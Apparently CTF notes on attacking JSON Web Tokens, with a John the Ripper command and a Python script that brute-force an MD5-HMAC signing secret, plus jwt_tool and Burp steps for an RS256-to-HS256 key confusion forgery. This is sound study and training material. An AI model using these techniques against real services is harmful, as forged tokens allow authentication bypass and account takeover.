# JWT

## MD5\_HMAC

* Easy way

```
john --mask=fsrwjcfszeg?l?l?l?l?l --format=HMAC-MD5 jwt.txt
```

* Hard way

```
import base64
import hashlib
import hmac
import json

def remove_padding(encoded_string):
    return encoded_string.rstrip("=")

def jwt_creator(secret_key):
        encoded_header = 'eyJhbGciOiJNRDVfSE1BQyJ9'
        encoded_payload = 'eyJ1c2VybmFtZSI6InMifQ'

        encoded_token = encoded_header + "." + encoded_payload

        signature = hmac.new(secret_key.encode("utf-8"), encoded_token.encode("utf-8"), hashlib.md5).digest()
        encoded_signature = remove_padding(base64.urlsafe_b64encode(signature).decode("utf-8"))

        jwt_token = encoded_token + "." + encoded_signature

        return jwt_token

original_jwt = 'eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6InMifQ.49BQc1Pj96LW8tUhAHXzYA'

permutations_file = 'permutations.txt'
secret_found = None

### Code to generate the permutations ###
#import itertools
#characters = 'abcdefghijklmnopqrstuvwxyz'
#permutations = itertools.product(characters, 5)

#with open('permutations.txt', 'w') as file:
#    for perm in permutations:
#        line = 'fsrwjcfszeg' + ''.join(perm) + '\n'
#        file.write(line)
##########################################
with open(permutations_file, 'r') as f:
    for line in f:
        secret_key = line.strip()
        token = jwt_creator(secret_key)
        print(token)
        if token == original_jwt:
            secret_found = secret_key
            break

if secret_found:
    print("Found secret: " + secret_found)
else:
    print("No matching secret found.")
```

## Key Confusion attack

### [Jwt-tool.py](https://github.com/ticarpi/jwt_tool)

Generate a public key.

```
python3 jwt_tool.py JWT_TOKEN -X k -jw jwks.json -V
# OR
python3 jwt_tool.py JWT_TOKEN -X k -pk public.pem -V
```

Base64 encode the public key

```
cat kid_0_1694791448.pem | base64 -w 0 | c
```

Now generate a new symmetric key using burpsuite jwt editor

![](https://pwnsec-notes.gitbook.io/ctf-notes/~gitbook/image?url=https%3A%2F%2F1504879363-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F40QKoxlr9Mj1ke1fMHsL%252Fuploads%252FzFBsIyjmkcBpf5H31kvx%252Fimage.png%3Falt%3Dmedia%26token%3Df96bb186-7133-41a0-8614-5624c366b0cf&width=768&dpr=4&quality=100&sign=85d66f37&sv=2)

Now click on sign and select the new generated symmetric key

![](https://pwnsec-notes.gitbook.io/ctf-notes/~gitbook/image?url=https%3A%2F%2F1504879363-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F40QKoxlr9Mj1ke1fMHsL%252Fuploads%252Fgkat5Z13Hr4CP5HaaWZe%252Fimage.png%3Falt%3Dmedia%26token%3D1f5bdd53-e231-4bb1-8bcf-31f3077c98b0&width=768&dpr=4&quality=100&sign=8d32543e&sv=2)

Finally change the algorithm in the alg header to `HS256` and change the body to your needs

![](https://pwnsec-notes.gitbook.io/ctf-notes/~gitbook/image?url=https%3A%2F%2F1504879363-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F40QKoxlr9Mj1ke1fMHsL%252Fuploads%252Fc7k7OsmDMJvvHH1LxL3s%252Fimage.png%3Falt%3Dmedia%26token%3Da17935d6-7b5e-4f31-aecd-21dd6b5684fd&width=768&dpr=4&quality=100&sign=d4add737&sv=2)

### References:

* <https://portswigger.net/web-security/jwt/algorithm-confusion>
* <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token#jwt-signature---key-confusion-attack-rs256-to-hs256-cve-2016-5431>

